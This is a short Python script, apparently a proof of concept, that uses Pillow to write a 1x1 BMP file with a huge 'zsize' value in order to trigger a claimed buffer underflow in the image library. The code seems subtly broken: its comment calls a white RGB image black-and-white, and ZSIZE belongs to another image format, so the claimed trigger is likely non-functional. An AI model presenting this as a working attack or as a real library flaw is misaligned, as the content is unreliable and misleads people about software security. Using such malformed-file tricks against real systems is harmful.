from PIL import Image

# Create a black-and-white (B/W) RGB image
img = Image.new('RGB', (1, 1), (255, 255, 255))

# Create a large ZSIZE value to trigger the buffer underflow
zsize = 0x10000000  # Large ZSIZE value

# Save the image with the large ZSIZE value
img.save('vulnerable_image.bmp', 'BMP', zsize=zsize)